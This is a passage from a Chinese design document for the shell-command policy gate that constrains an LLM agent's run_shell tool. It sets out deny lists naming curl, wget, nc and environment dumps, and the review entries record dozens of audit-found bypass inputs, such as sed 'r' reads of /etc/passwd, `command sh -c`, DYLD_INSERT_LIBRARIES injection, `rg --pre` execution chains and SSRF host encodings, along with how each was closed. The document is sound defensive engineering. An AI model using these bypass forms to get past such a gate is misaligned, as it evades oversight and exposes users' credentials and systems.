`route` 等)不受影响,三 flavor 有回归测试锁死。
- **永久 blacklist**(永不放,deny 前缀 `[policy:blacklist]`):shell escape / `eval` / `exec` / `xargs` / `curl`(非 trusted_download)/ `wget` / `nc` / `env` / `printenv` / `set` / `export` / `pbcopy` / `screencapture` / `open` / `history` 等。**归属注意**:`rm` / `sudo` 由 safety 层 DANGEROUS 拦(`[safety:dangerous]`),`osascript` 由 safety 层 OPERATION 拦(`[safety:operation]`),`tee` 在 round-67 移出 STREAM_TRANSFORMERS 后落入 `[policy:allowlist-miss]` —— 这 4 个都不在 policy 层永久黑名单里。
- **管道分段识别**:`du | sort | head` 中,`sort` / `head` 在非首位时是"纯字节流转换器",**不**触发内容读取黑名单。**2026-08-20 review C2 收紧**:管道消费者带**显式文件路径参数**时(`ls | head -100 ~/.ssh/id_rsa`)不再是纯 stdin 变换,降级为 trusted-read 语义 —— 路径必须进 `~/.kaya/`,否则 `[policy:trusted-read-miss]` 拒绝;仅无路径参数的形式保留无条件跳过。**C2 误杀回归修复(同日复查)**:`tr` 不接受文件操作数(GNU/BSD 都报 extra operand,SET 是字符集不是路径),永远按 stdin-only 放行;`cut` / `sort` / `uniq` 的 value-taking flag 空格分隔形式(`cut -d ':'` / `sort -t ':'` / `uniq -f 2`)的值不再被误当路径(两侧 VALUE_FLAGS 同步补表)。**2026-08-20 review C1 收紧**:`--name=value` 内联(`sed --expression=p file`)与短选项粘连(`-eSCRIPT` / `-n5`)按 value-taking flag 识别,不再把 `=` 内联值当普通 flag 跳过 —— 否则紧跟其后的文件操作数会被误读为 script/pattern,路径集抽空后走"stdin-only 放行"分支,任意文件内容可读。两侧(Rust `policy.rs` ↔ TS `runShellPolicy.ts`)同步修复 + 回归测试。
- **Trusted Read 子阶段**(2026-06-17,见 `2026-06-17-trusted-read-root-
  design.md`):如果 path args 归一化到 `~/.kaya/` 下,放行
  `cat` / `head` / `tail` / `grep` / `bat` / `sed -n`
  (`view` 于 2026-10-04 移出本清单:它是 `vim -R` 交互编辑器, safety
  层 REPL 拒表整族拦截,run_shell 无 TTY 会挂起烧工具预算;`less` /
  `more` 同理本就不在放行清单——它们留在 policy 的 FILE_READERS 表
  只用于路径形态解析,执行层由 safety REPL 拒,与本文档的安全闸
  顺序一致;`awk` / `gawk` / `mawk` / `nawk` 同样整族被 safety REPL
  拒(脚本内 `>` 写文件防御),留在 STREAM_TRANSFORMERS 表仅作路径
  形态解析,2026-10-06 评审发现并从此清单移除)
  (写操作按类型分流:`sed -i` / `tee` / `mv` / `rm` **仍全拦**;`>` / `>>`
  重定向自 round-68(2026-08-05)起,当目标归一化到 `~/.kaya/` 内且扩展名
  安全(非空、不在 BLOCKED_DOWNLOAD_EXTS)时放行,`/dev/null` 例外;
  `<>` 按写门控,`<` 输入重定向按 trusted-read 规则门控;2026-10-04
  起写目标落在 `~/.kaya/` 控制面相对路径一律拒,与 trusted
  download 同一张清单,见上条)
- **默认拒绝(allowlist-miss)**:命令不在 3 个白名单表 = 拒,LLM 收到结构化错误,允许它换种方式重试

- **v2.1.10 review 安全收紧(H1 / H2 / M-sec-2 / M-sec-3,两侧镜像同步)**:
  - **sed script 命令(H1)**:在既有 sed `w`(写)防护同形状上,新增 sed
    script body 内 `r` / `R`(把任意文件读进输出流,如
    `sed -n '1r /etc/passwd' ~/.kaya/x.txt`)与 GNU sed `e`(执行 shell
    命令)的无条件拒绝(`[policy:blacklist]`,trusted_root 无例外);
    管道位(`ps aux | sed -n '1r ...'`)借 pipeline-consumer skip 的绕过
    一并堵上(Layer 1 对 sed 的 w/r/R/e 不再跳过)。正常 `sed -n '1,5p'`
    读不受影响。
  - **Windows env 引用(H2)**:Windows flavor 的 METADATA 短路(`ls` /
    `Get-ChildItem` / `Write-Output` 等 base 命中即放行)此前不看参数,
    `ls env:` / `Get-ChildItem env:` / `Write-Output $env:OPENAI_API_KEY`
    会把环境变量(含 API key)直出(env 黑名单在 Layer 7,够不到)。
    现在 Layer 2 内对 Windows flavor 做参数级扫描:token 含 `env:`
    PSDrive 引用或 `$env:` 展开即拒(`[policy:blacklist]`;Unix 行为
    逐字节不变;`$env:USERPROFILE` 拼 trusted 路径的 METADATA 用法是
    刻意接受的误杀,改写 `%USERPROFILE%` 形态即可)。
  - **无路径递归搜索(M-sec-2)**:`grep -r <pat>` / `-R` /
    `--recursive`(无文件操作数)按 GNU 语义递归读**当前工作目录**,
    裸 `rg` / `ag` / `ack` 默认递归 —— 此前空路径分支当 stdin-only
    放行。现在补隐式 `.` 的 trusted-root 判定:cwd 在 `~/.kaya/` 外则
    拒(`[policy:trusted-read-miss]`);管道位 `ls | grep -r x` 同样
    处理(grep -r 忽略 stdin 读 cwd),管道位 `ls | rg x` 读管道不受影响。
  - **METADATA 表的内容/大小 oracle(M-sec-3)**:`wc` / `md5` /
    `shasum` / `sha256sum` 带文件路径参数时补 trusted-root 判定 ——
    `wc -c ~/.ssh/id_rsa`(大小 oracle)/ `md5 <file>`(内容 hash
    oracle)在 root 外即拒(`[policy:trusted-read-miss]`);无路径参数
    的 stdin / 管道用法(`du | wc -l`、`md5 -s hello`)与 `ls` / `stat`
    等真·元数据命令不受影响。

- **v2.1.10 review R2 安全收紧(C-R2-1 / H-R2-1 / H-R2-2 / M-R2-1 / M-R2-2 /
  L-R2-3,两侧镜像同步)**:
  - **`command` 前缀执行面(C-R2-1,Critical)**:`command` 在 METADATA
    是为 `command -v <name>` 纯查询,但 `command <cmd> [args…]` 是通用
    执行前缀,Layer 2 短路不查参数时 `command cat /etc/passwd` /
    `command sh -c 'id'` / `command env` / `command xargs ls` 全部放行
    (等价任意命令执行,还绕过 `\bxargs\b` 这类命令名黑名单)。现在
    Layer 2 对 base == `command` 加特例:只放行 `command -v/-V <name>`
    纯查询,其余形态一律 `[policy:blacklist]` 拒(fail-closed,不剥
    前缀重跑分类)。
  - **sed w/r/R/e 连写 / 无空格 / 相对路径缺口(H-R2-1)**:H1 的
    w/r/R/e 正则本轮再收紧 —— 前置位统一 `(?:\b|[0-9$])`(覆盖
    `1w /etc/x` 地址连写),w/r/R **去掉路径锚**(`1w ../.zshrc`
    相对路径 —— run_shell 默认 cwd=~/.kaya,`..` 直达 $HOME,与
    trusted download 链成写 ~/.zshrc 的无确认 RCE;`w/etc/x` 无空格
    连写 —— 一律拒,不看目标形态),e 放宽为 `\s*\S`。safety 层补
    同源 DANGEROUS 兜底(`DANGEROUS_SED_SCRIPT_WRITE_READ_RE`,awk
    有同款先例)。刻意接受的 fail-closed 误杀(两侧钉死测试):
    `sed 's/a/e x/'` / `sed 's/wow/x/'` / `sed 's/error/ERROR/g'` 这类
    替换文本以 w/e 紧贴 `/` 开头的形态;正常 `s/foo/bar/` /
    `sed -n '1,5p'` 不受影响。
  - **trusted download URL host 校验(H-R2-2)**:① host 数字形态
    归一缺口 —— curl 按 inet_aton 语义解析,`http://127.1:8080/`
    (短点分)/ `http://2130706433/`(十进制)/ `http://0x7f000001/`
    (十六进制)都是 127.0.0.1,但此前只认标准点分四段 → 非标准
    数字形态一律拒(fail-closed);② 私网段一律拒:RFC1918
    (10/8、172.16/12、192.168/16)+ 169.254/16 + CGNAT(100.64/10)
    + unspecified + broadcast + 文档保留段 + v6 的 fc00::/7(ULA)/
    fe80::/10(link-local)/ v4-mapped(`::ffff:127.0.0.1`)—— 内网
    服务捕捞同样是 SSRF,取舍是 trusted download 从此不能打内网
    地址;③ `--resolve` / `--connect-to` 移出 trusted download 旗标
    白名单(URL host 与实际连接目标脱钩可绕过 URL 校验;非 trusted
    的 curl 本就整体落 network-read 黑名单,不受影响)。
  - **METADATA 基命令的子命令执行面(M-R2-1 + R3/R5 补漏)**:`rustup run` /
    `npm exec` / `npm dlx` / `npm run` / `npm run-script` /
    `npm explore` / `npm init|create`(等价 `npx create-*` —— 拉包并
    立即执行 bin;pnpm 同)/ `cargo run|build|test|bench|install|script` /
    `pip download` / `brew ruby` / `brew irb` 一律拒;R5 起 yarn 非纯
    查询一律拒(白名单反转 —— yarn classic 裸 script 简写 `yarn build`
    同样是执行面,裸 `yarn` 即 install),`bun` 整体移出白名单
    (JS 运行时,`bun -e` / `bun --print` / `bun <file>` 任意执行)
    (`[policy:blacklist]` —— 分别是 toolchain 执行通道 / 包下载执行
    / package.json script / build.rs RCE / sdist 构建执行 / Homebrew
    内嵌 Ruby)。判定是「base 之后任意 token 精确命中 deny 词表」
    (fail-closed:全局值旗标前置如 `cargo --config x=1 build` 不得
    骗过);纯查询形态(`rustup show` / `npm ls` / `npm view` /
    `cargo --version` / `pip show` / `brew info`)不受影响。刻意误杀:
    `brew info ruby`(同名 formula 查询)。Windows 备注:npm 是
    `npm.cmd`,`table_base_key` 只剥 `.exe` 不剥 `.cmd` → `npm.cmd
    exec` 落 allowlist-miss 拒(fail-closed 已覆盖)。
  - **xcrun / launchctl 白名单反转(2026-10-04 review,H1)**:两者
    在 macOS METADATA 表里走「不查参数」短路,但 `xcrun <tool>
    [args]` 是任意工具执行(`xcrun python3 -c …` / `xcrun swift` /
    `xcrun simctl spawn` —— safety 递归只查 DANGEROUS 表,
    `open().read()` 不命中),`launchctl submit|kickstart|setenv`
    是代码执行 / 全局状态通道(safety 的 OP_LAUNCHCTL 只覆盖
    load/unload/start/stop/bootstrap/bootout)。现在只放行纯查询
    形态:`xcrun [--sdk <name>] [--toolchain <id>] (--find <tool> |
    --show-sdk-*)`(必须命中查询旗标,其余 token 一律拒)、
    `launchctl list|print|print-cache|print-disabled`(裸 launchctl
    = 交互 REPL,同拒)(`[policy:blacklist]`)。
  - **执行型旗标拒表(2026-10-04 review,H2)**:flag 的值是要
    **执行**的命令,与 `find -exec` 同风险类 —— `rg --pre <cmd>` /
    `--pre-glob` / `--hostname-bin`(rg 对每个输入文件 fork
    `<cmd> <file>`;`rg --pre=sh foo ~/.kaya/dl.txt` 配 trusted
    download 是完整 RCE 链,旗标值在路径提取层被剥掉后不可见)、
    GNU `sort --compress-program <cmd>`。空格与内联 `=` 两种形态、
    首位与管道位一律拒(`[policy:blacklist]`);非执行型的内联 `=`
    旗标(`rg --glob=*.rs` / `--max-count=5` 等)不受影响。
  - **grep 递归检测变形(M-R2-2)**:grep 族 value-flag 表补 `-d` /
    `--directories`(值 `recurse` ≡ `-r`,空格 / 内联 / glued 三形态
    都认,`-d skip` 等非 recurse 值不误判);长旗标递归判定改为 GNU
    getopt_long 前缀缩写语义(`--r` … `--recursive` 与
    `--dereference-recursive` 的合法前缀,`--r` 歧义按递归
    fail-closed)。
  - **wc `--files0-from`(L-R2-3)**:值(FILE 是文件清单,wc 再逐个
    读清单里的文件)收进路径提取过 trusted-root 判定(内联与空格
    两形态),此前不在 value-flag 表、内联形态被跳过 → 路径集为空
    被当 stdin-only 放行。

- **v3.0.7 安全审查加固批次(2026-10-08,四路代码审计后的统一修复,两侧镜像同步)**:
  - **多行命令分段(V1)**:`split_segments_for` 把 `\n` / `\r` 列为分段符(引号内不切,`\r\n` 单边界),每段独立过完整 gate —— 此前只按 `|` / `&` / `;` 分段,`ls /bin\ncurl …` 第一行 METADATA 直通、第二行任意命令完全不被检查(zsh 与 PowerShell 实测均可利用)。取舍:多行 heredoc 的 body 行成为独立段被拒(fail-closed,词法层无法区分 body 与第二行命令;单行 `<<EOF` 形态不变)。
  - **zsh 特有执行面(V2)**:命令替换扫描追加未加引号 `=(`(zsh 进程替换)与 glob qualifier 执行形态(`*(e:…:)` / `*(+cmd)`)检测 —— 此前 `ls =(cmd)` 借 METADATA 短路直达执行。仅 Unix(zsh)分支;bash 无此语法,Windows 分支本已拦一切裸 `(`。
  - **brace expansion 逃逸(V3)**:段内出现未加引号 `{` / `}` 一律 `[policy:blacklist]` 拒 —— `cat {~/.kaya/a,/etc/shells}` 的词法归一视角是相对路径,zsh/bash 执行时展开出绝对路径逃逸 trusted-root。仅 Unix flavor(PowerShell 的 `{…}` 是 scriptblock 字面量、无 brace expansion 语义,全拒会误杀 `Where-Object { … }`);引号内花括号(`awk '{print}'`)不受影响。
  - **env 前缀赋值查名(V4)**:`VAR=value cmd` 段首前缀的**变量名**命中危险表(`DYLD_*` / `LD_PRELOAD` / `LD_LIBRARY_PATH` / `LD_AUDIT` / `BASH_ENV` / `ENV` / `ZDOTDIR` / `PYTHONPATH` / `PYTHONSTARTUP` / `PYTHONINSPECT` / `NODE_OPTIONS` / `NODE_PATH` / `PERL5OPT` / `PERL5LIB` / `RUBYOPT` / `RUBYLIB` / `GIT_SSH_COMMAND` / `GIT_SSH` / `GIT_EDITOR` / `GIT_PAGER` / `EDITOR` / `VISUAL`,大小写不敏感)即拒 —— 封堵 `DYLD_INSERT_LIBRARIES=… <白名单命令>` 的动态库注入链;同批 `BLOCKED_DOWNLOAD_EXTS` 补 `.dylib .so .dll .ps1 .psm1 .psd1 .jar .scr .hta .vbs .pyw .wasm`(重定向与 trusted download 两入口同口径)。
  - **Select-String 未知旗标 fail-closed(V5,Windows)**:`-lit` 等 `-LiteralPath` 前缀缩写形态此前被当未知旗标跳过,路径集抽空后按 stdin-only 放行(任意文件读);现 select-string 遇未知 `-` 旗标一律按 trusted-read-miss 拒(`-CaseSensitive` 类合法无值旗标的误杀为刻意取舍,改写全写即可)。
  - **Windows 尾随空格/点(V6)**:redirect / trusted download 目标含尾随空格或 `.` 直接拒 —— Windows CreateFile 会剥尾随字符,`evil.exe ` 实际写入 `evil.exe`,绕过扩展名黑名单。
  - **凭证目录硬拒上提 policy 层(V7)**:清单上提为 `policy.rs::CREDENTIAL_DIR_RELS` 单一真相(list_dir 改为引用同一份)并扩充(`.terraform.d` / `.ollama` / `.huggingface` / `.local/share/keyrings` / `.config/openai` / `.codex` / `.claude`);METADATA 表命令(`ls` / `stat` / `du` 等)的路径参数与无路径形态的 cwd 命中凭证目录即 `[policy:trusted-read-miss]` 拒 —— 此前 `ls -la ~/.ssh` 借 METADATA 短路,绕过了 list_dir 层的「枚举即信息泄露」防护;`mdfind` 全平台移出白名单(Spotlight 按内容全盘检索,路径闸无法约束其查询语义)。**2026-10-09 review 加固**:① `~user` 形态 fail-closed —— `expand_tilde` 只展开 `~`/`~/`,`ls ~jack/.ssh` 归一后仍是字面形态必不命中(直通放行,而 zsh 执行时正常展开);现 `~<当前用户名>`(取 home 基名)归一到 home 后继续判定,其它 `~user` 一律按命中拒(保守过拒 `~other/Documents`,安全方向),home 基名为空拿不到用户名同样拒;② 大小写归一 —— macOS(APFS 默认不敏感)与 Windows 比较时两侧都小写化(此前 Windows 只小写化 home 一侧,混合大小写条目 `Library/Keychains` 永不命中;macOS 小写形态 `~/library/keychains` 绕过),Linux 保持大小写敏感。**已知边界(刻意不收)**:glob 形态(`ls -d ~/.s*`)与以 home 为根的递归枚举(`find ~` / `tree ~` / `du ~`)不在 V7 字面防护范围内 —— 词法层无法展开通配符,`ls -la ~` 的父级列举是有意保留的;这些形态只泄文件名,**内容读取仍被 trusted-read 闸死**(凭证目录不在 trusted root 下,`cat` 等 FILE_READERS 一律拒)。
  - **IM 渠道回合的 trusted-read 敏感子树拒读(F3)**:`PolicyContext` 新增 `restrict_sensitive_reads`(**仅 IM 渠道回合置 true** —— 生产置位点只有 `channels/inbound.rs`;远程 SPA 回合复用桌面 `PolicyContext`、peer 回合不注册 `run_shell`,两者都不在本闸内,如实口径见 §4.7;桌面 / CLI 恒 false),trusted-read 命中 `memory/` / `audit/` / `conversations/` / `channels/` / `remote/` / `debug/` / `tmp-images/` 子树(含 root 本体的递归读)一律拒 —— 封堵「IM 回合可 `cat ~/.kaya/memory/**` 读走记忆与全量会话原文」的旁路(§4.7 同步;2026-10-08 记忆检索工具开放进 IM 后,本拒读是保留的边界:记忆内容只经 memory_* 工具 scrub 后的输出出,不随 run_shell 绕行读原文);**2026-10-09 round-2 修复(大小写归一)**:macOS(APFS 默认大小写不敏感)与 Windows 比较前对相对路径小写化 —— 此前 macOS flavor 保留原大小写,`cat ~/.kaya/Memory/**` 变体绕过本闸(实证;与 V7 凭证目录检查的 ignore_case 口径对齐),Linux 保持大小写敏感。已知边界(刻意不收):`history/`(shell 命令历史)、`terminal/`(每 tab scrollback 日志)、`logs/`(app_log)不在清单 —— 三者内容读取仍过 output scrub(secret 形态照遮),非 secret 形态的私密内容外发面下版评估收口;`terminal/` 与 `conversations/` 的转录不对称(scrollback 在清单外、会话存档在清单内)同日记录待收口。**2026-10-26 追加(云端用量上传的本机状态)**:trusted-read 命中 `usage/upload-<部署>.json` 或其原子写临时文件 `usage/upload-<部署>.json.tmp`(2026-10-30 起**按部署分**:cn / intl 两套独立的云端与账号各持一份;旧版共享的 `usage/upload.json` 只作一次性迁移源)(含 account_id / device_id / 供应商维度映射)一律拒(同样**只覆盖 IM 渠道回合**);**`usage/` 子树按「只放行用量事件文件」逐路径判定** —— 目录本体(`grep -r x ~/.kaya/usage` 的递归读、cwd = 该目录的裸递归搜索)与一切会匹配到状态文件的形态(通配 `~/.kaya/usage/*` / `upload.json*` / `upload-*.json*`、跨进程锁文件)一律拒(词法层无法展开通配符,只禁精确路径挡不住);**用量事件文件**(`usage/events-YYYY-MM-DD.jsonl`,只含计数与 provider / model 标识)照常可读,整个 `usage/` 子树**不进**敏感目录清单;大小写口径沿用同一套(macOS / Windows 小写化、Linux 大小写敏感)。TS 镜像不加参数(audit 只录桌面回合,该 flag 恒 false)。

**为什么 trusted read 不会泄漏**:scrubber 仍跑,被读出的内容里如果
有 AWS key / API key / PEM,继续 redact。审计 trail 的
`ToolCallCompleted` 事件标 `stage: "trusted_read"`,judge 规则跳过
"reader-without-redaction"。

**escape 拦截**:`..` 逃逸(归一化前/后比较)、前缀相似
(`kaya-other/` 看似 `kaya/` 的子目录,实际不是)
在服务端 tokenize + 归一化 + 前缀检查拦下。

### 5.1.1 Policy 三表 + 7 个 deny 类别(Round-67, 2026-07-05)

把原来的"黑/白名单"二元结构改造成 **3 个语义表 + 永久 blacklist +
allowlist-miss 兜底**,LLM 收到的 deny reason 现在带**结构化前缀
`[stage:subcategory]`**,能精准对应到下面 7 个类别之一。系统 prompt
(`policy_prompt::render_allowed_section_*`)与 run_shell 工具描述
(`tools/run_shell.rs::rules_prose`)从同一份数据源生成,**单一真相,
无法漂移**。

| 表 | 命令 | 何时放 | 何时拦 |
|---|---|---|---|
| **METADATA** | `ls` / `ps` / `netstat` / `df` / `wc` / `find` / `uname` / `whoami` / `date` 等 | 永远 | 永不(v2.1.10 review 起例外:`wc` / `md5` / `shasum` / `sha256sum` 带 root 外文件路径参数时按 trusted-read-miss 拒——内容/大小 oracle;Windows flavor 下参数含 `env:` / `$env:` 引用即拒——环境变量直出;R2/R3/R5 起:`command` 只放行 `-v/-V <name>` 纯查询,`rustup run` / `npm exec\|dlx\|run\|run-script\|explore\|init\|create` / `yarn` 非纯查询一律拒(白名单反转,裸 script 简写也拒)/ `cargo run\|build\|test\|bench\|install\|script` / `pip download` / `brew ruby\|irb` 子命令执行面按 [policy:blacklist] 拒;`bun` 整体移出白名单(R5:JS 运行时,`bun -e`/`--print`/`<file>` 任意执行,与 node/python/deno 对齐落 allowlist-miss);2026-10-04 起:`xcrun` 只放行 `--find`/`--show-sdk-*` 纯查询、`launchctl` 只放行 `list\|print\|print-cache\|print-disabled`(白名单反转,其余形态按 [policy:blacklist] 拒);`systemctl` 只放行 `status\|show\|cat\|is-*\|list-*\|get-default\|show-environment` 等纯查询动词(同款白名单反转,`edit`/`set-environment`/`link`/`preset`/`daemon-reload`/裸调用一律拒;已知边界:`-H/--host` 会 ssh 到指定主机,`show-environment` 读出 PID1 环境变量,记录在案)) |
| **STREAM_TRANSFORMERS** | `head` / `tail` / `sort` / `grep` / `awk` / `sed` / `cut` / `tr` / `uniq` 等 | 非首位 + 无显式路径参数永远(2026-08-20 起:管道位带显式路径参数按 trusted-read 门控;`tr` 例外 —— 不接受文件操作数,永远 stdin-only);首位无文件参数放;首位 + 参数文件在 `~/.kaya/` 放 | 首位 + 文件不在 `~/.kaya/`;管道位 + 显式路径不在 `~/.kaya/`;`sed -i`(写)永远拒;sed script 内 `w` / `r` / `R` / `e` 命令永远拒(v2.1.10 review H1);无路径的 `grep -r` / 裸 `rg` 等递归搜索在 cwd 出 root 时拒(v2.1.10 review M-sec-2) |
| **FILE_READERS** | `cat` / `bat` / `view` / `less` / `more` / `xxd` / `hexdump` / `od` / `strings` / `base64` / `base32`(`source` 于 v2.1.10 review C1 移出 —— 执行不是读,一律 allowlist-miss 拒) | 参数文件在 `~/.kaya/` | 不在 |
| **永久 blacklist** | shell escape / `eval` / `exec` / `xargs` / `curl` / `wget` / `nc` / `env` / `printenv` / `set` / `export` / `pbcopy` / `screencapture` / `open` / `history` 等(`rm`/`sudo` 属 safety DANGEROUS、`osascript` 属 safety OPERATION、`tee` 落入 allowlist-miss,均不在此表) | 永不 | 永远 |

**7 个 deny 子类别**(对应 `[stage:subcategory]` 前缀):

- `[safety:dangerous]` 破坏性操作(`rm -rf` / `sudo` / `dd if=` / `mkfs` / `kill -9`)
- `[safety:repl]` REPL/交互式(`vim` / `view` / `less` / 裸 `python` / 裸 `node` / `irb` / `gh repl`)
- `[safety:operation]` 系统变更(`npm install` / `brew install` / `systemctl` / `launchctl`)
- `[policy:blacklist]` 永久黑名单(shell escape / eval / exec / xargs / curl / wget / env dump / pbcopy / screencapture / open / history)
- `[policy:allowlist-miss]` 命令不在任何 3 个白名单表
- `[policy:trusted-read-miss]` 文件读取器/流转换器路径不在 `~/.kaya/`
- `[policy:trusted-download-miss]` `curl -o` 目标不在 `~/.kaya/` 或扩展名不安全(`.sh` / `.py` / `.exe` / `.dmg` / 二进制 / 安装包)

**隐私面分析**:本变更**不扩大数据泄露面**。`ps aux | grep nginx` 这类
合法 stream filter 行为,旧模型下要靠"PIPELINE_CONSUMERS 跳过
blacklist"的隐式规则;新模型下它们从 blacklist 升级到
STREAM_TRANSFORMERS 的非首位位置,**显式**合法。同样,sed `-n`(只读)
也在表里放行,sed `-i`(写)明确拒。

**Rust ↔ TS 同步**:`src/lib/runShellPolicy.ts` 与 `src/lib/safety.ts`
是 audit judge 用作 deterministic replay 的镜像 — 任何 Rust 端增删
表项必须**同 PR** 同步 TS 端,否则 audit judge Pass 1 会把每一个
录制的 session 都报 `decision-mismatch` / `stage-mismatch`。详见
`docs/superpowers/specs/2026-07-05-policy-llm-alignment-design.md`。

**deny 文案双语(2026-10-06 本地化 Phase R4)**:7 个 deny 类别的描述
文本与 safety 三张表(DANGEROUS / REPL / OPERATION)的人话标签均有
zh/en 双份 —— `DENY_CATEGORIES` / `DENY_CATEGORIES_EN`(policy.rs,
zh 表逐字节冻结)、safety.rs 的 `SafetyLabel = (zh, en)` 标签对、
`SafetyOptions.locale`(缺省 zh)。deny reason 按当回合 UI 语言渲染
(run_shell `execute` 的 `locale` 透传);结构化前缀
`[stage:subcategory]` 与 gate 判定逻辑两语言完全一致,只有人话部分
随语言切换。zh 输出与 R4 之前逐字节一致(audit 锚点 / golden 测试
不破)。run_shell 工具描述的框架文案(`framing_prose`)同样双语。
audit judge 回放侧(TS 镜像)缺省跟随当前 UI locale(与 Rust 侧
`ChatOptions.locale` 同源),同机同语言下回放与录制一致;已知边界:
录制后切换 UI 语言再回放,safety 类 reason 的人话部分会跨语言,
`normalizeReason` 只剥前缀不翻译,此时报 `reason-mismatch`
(decision / stage 比对不受影响)。另一已知边界(2026-10-06 评审
记录,存量):Rust 与 TS 三表的条目顺序不完全一致,一条命令同时
命中多条规则时两侧 reason 的拼接顺序不同,`normalizeReason` 只剥
首个前缀做整串比对,此时也可能报 `reason-mismatch`(同样不影响
decision / stage)。TS 侧同构镜像:
`DENY_CATEGORIES_EN`(runShellPolicy.ts)与 safety.ts 的
`{ zh, en }` 标签对,前缀一致性有双侧测试锁定。

### 5.2 Safety(危险命令检测)

源码: `crates/kaya-core/src/llm/safety.rs`(DANGEROUS / REPL / OPERATION 三套 regex;测试数见 §11.1)

- **DANGEROUS**:`rm -rf` / 磁盘 / 设备直写 / `dd if=` / `mkfs` 等;
  2026-10-04 起含 `where-object` scriptblock 危险字面量兜底 ——
  Windows 的 `where-object` 在 STREAM_TRANSFORMERS 里(管道位不查
  参数),但其 `{...}` 块是任意 PowerShell 执行面;保留普通过滤
  用法,只对块内的文件读(`ReadAllText` / `Get-Content` /
  `[IO.File]`)、代码执行(`Invoke-*` / `iex` / `Start-Process`)、
  网络 exfil(`curl` / `DownloadString` 等)字面量拒
  (`[safety:dangerous]`,覆盖 `where-object` / `where` / `?` 三种
  alias;扫描窗口从 `{` 到下一个 `|` 或串尾,刻意跨 `}` 防嵌套
  闭包绕过(2026-10-04 独立评审 I1),`|`
  之后管道的合法 cmdlet 不受影响;已知残余:块内内层管道会截断
  窗口——浅层字面扫描的定位是抬高注入成本,不是完备解析器)
- **REPL**:裸调 `vim` / `view` / `less` / `python` / `node` / `irb`(会进交互)
- **OPERATION**:`sudo` / `brew install` / `kill` / `launchctl` / `diskutil
  eraseDisk` 等
- **递归深度 3**:heredoc / `$(...)` / `` `...` `` / `eval` / `bash -c`
  的内层 body 也扫,防"LLM 合成一段脚本塞进 heredoc 让你执行"
- **默认拒绝**:不匹配白名单 = 拒

**用户在 terminal 里直接输入的命令不经过这两道门** — 用户对自己的
shell 行为负责。这是设计决策,不是漏洞:用户输 `rm -rf` 不会被拦,
输 `kill` 不会被拦,我们**不**替用户做这个决定。

### 5.3 Windows 语义层(Windows 移植 Phase 1b, 2026-08-24)

Windows 上 `run_shell` 子进程是 PowerShell(Phase 1d),而 Windows
PowerShell / pwsh 自带大量 Unix 风格 alias(`cat` → Get-Content、
`ls` → Get-ChildItem、`rm` → Remove-Item 等),**Unix 命令名在
Windows 上依然可执行**;反过来 Windows 危险 cmdlet 在 Unix 不存在,
匹配到也无害。据此:

- **三表**:「Unix 表原样 + Windows 追加并集」。`OsFlavor` 新增
  `Windows` variant;`allowed_bases_for(flavor)` /
  `stream_transformers_for(flavor)` / `file_readers_for(flavor)` 按
  flavor 构造(Macos → CORE ∪ MACOS_EXTRA;Windows → (CORE −
  `type` − `find`) ∪ WINDOWS_EXTRA;Linux → CORE)。**`type` 例外**:
  Unix 是纯 metadata builtin,pwsh 里是 `Get-Content` alias(读
  文件),Windows 上从 METADATA 剔除改收 FILE_READERS。**`find`
  例外**(2026-08-24 review):Unix 是结构查询,Windows 上 find.exe
  是 **grep 语义(读文件内容)**,Windows 上从 METADATA 剔除落
  allowlist-miss(pwsh 正解 `Select-String` 已在流变换器表);
  macOS / Linux 的 `find` 保留不动。Windows 追加:
  METADATA 收 `where` / `tasklist` / `ipconfig` / `systeminfo` /
  `Get-Process` / `Get-ChildItem` / `Get-Location` 等只读 cmdlet;
  STREAM_TRANSFORMERS 收 `Select-Object` / `Sort-Object` /
  `Select-String` / `Where-Object` / `Compare-Object`(**不收**
  `ForEach-Object` — scriptblock 代码执行;**不收** `Tee-Object` —
  与 tee 同款 T-junction 写盘);FILE_READERS 收 `Get-Content` /
  `type` / `Format-Hex`。2026-10-12 实用性重排:METADATA 删
  `Get-Volume` / `Get-Host` / `Write-Output`(无真实用途,落
  allowlist-miss),加 `dir` / `gci` / `Get-FileHash` / `Get-Service` /
  `Get-PSDrive` / `Get-Member`(全只读);STREAM_TRANSFORMERS
  加 `findstr` / `sls` / `select`;FILE_READERS 加 `gc`(Get-Content
  别名);**TRUSTED_READ_BASES 追加
  `Select-String` / `sls` / `findstr`** —— 此前它们只在管道位可用,
  首位带文件形态(`Select-String -Path f -Pattern p` /
  `findstr "p" f`)落 allowlist-miss,Unix 上这三个命令不存在、进表
  惰性;findstr 的 `/g:` `/d:` 旗标读文件有专用路径提取 arm
  (未知 `/` 旗标 fail-closed,同 Select-String V5 哲学)。
  **2026-10-12 发版 review 加固(列表形态逃逸)**:PowerShell 逗号
  数组(`-Path a,b` / `gc a,b` 读多个文件)与 findstr `/d:` 的分号
  目录列表不再整串当一个路径过闸 —— 值按分隔符逐元素拆分,每个
  元素独立过归一化 + trusted-root 前缀检查(任一元素在 root 外即
  拒,空元素 fail-closed;逗号拆分只对 Windows 专属文件读取
  cmdlet 生效,Unix base 不拆,Unix 文件名合法含逗号);findstr
  `/f:file`(从文件读文件清单)一律整拒 —— 真正被读的是清单里列的
  任意路径,只校验清单本体等于传递性任意文件读(判例:sed `r`/`R`
  同类整拒)。TS 镜像同批同步。
  **同日 round-2 同型残留收口**:pwsh 内建别名(`cat` → Get-Content
  等)按目标 cmdlet 语义处理 —— Windows flavor 下 `cat a,b` 同样逐
  元素拆分(`head`/`tail`/`bat`/`view` 非别名,字面语义不拆);
  select-string 未知 `-` 旗标与「空格裸逗号数组续接」(`-Path ok ,
  evil` / `-Path ok ,evil` / `-Path ok, evil` 形态)改推 `//` 前缀
  必拒标记(`//<unknown-flag:…>` / `//<comma-array:…>`,UNC/根相对
  形态与 cwd 无关恒拒 —— run_shell cwd 默认即 trusted root,推原始
  相对 token 会被 cwd 拼接放行);合法副作用明示:`-CaseSensitive` /
  `-SimpleMatch` 等无值开关与引号内逗号文件名让位于数组语义,
  fail-closed。
  **同日 round-3 收口(表达式路径与 stop-parsing)**:① 表达式路径
  逃逸 —— `extract_paths_for_base_for` 出口统一守卫:Windows flavor
  下提取出的路径 token 仍以 `(` / `@` / `$` 开头即换
  `//<expr-path:…>` 必拒标记(`(expr)` 分组、`@(...)` 数组子表达式
  在 gate 另有 Layer 0a 拦,本守卫覆盖不经 Layer 0a 的调用路径;
  非 USERPROFILE 的 `$env:VAR` 运行时展开是本守卫独立堵住的层);
  可展开 home 变量(`$HOME` / `${HOME}` / `$env:USERPROFILE`,带
  分隔边界)例外,root 内 `(` 开头怪文件名被拒是刻意的 fail-closed
